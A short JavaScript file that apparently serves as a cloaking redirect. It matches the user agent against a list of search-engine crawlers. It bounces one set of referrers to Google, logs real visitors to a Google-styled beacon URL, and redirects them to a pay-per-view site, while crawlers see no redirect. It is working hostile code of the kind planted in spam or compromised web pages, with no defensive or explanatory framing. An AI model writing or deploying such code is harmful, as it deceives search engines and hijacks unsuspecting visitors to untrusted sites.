const ua = navigator.userAgent.toLowerCase();

const knownBots = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver',
    'bot', 'crawler', 'spider', 'mediapartners-google'
];

const referrer = document.referrer || '';

// Bad referrers to block
const badReferrers = [
    "https://www.google.s3.amazonaws.com",
    "https://google.s3.amazonaws.com",
    "google.s3.amazonaws.com"
];

const isBot = knownBots.some(bot => ua.includes(bot));
const isBadReferrer = badReferrers.some(r => referrer.includes(r));

function logCurrentPage() {
    const pageName = window.location.pathname.split('/').pop() || "index.html";

    const logData = JSON.stringify({
        page: pageName,
        timestamp: new Date().toISOString(),
        referrer: referrer,
        blocked: isBadReferrer
    });

    navigator.sendBeacon("https://google.com/log-click.php", logData);
}

// Main Logic
if (isBadReferrer) {
    console.log("⚠️ Bad referrer detected → Redirecting to Google");
    window.location.replace("https://www.google.com");
}
else if (!isBot) {
    console.log("✅ Real user detected");
    logCurrentPage();                    
    window.location.replace("https://ppv.buddie.fun/events/21");
} 
else {
    console.log("🤖 Bot detected - No redirect");
}
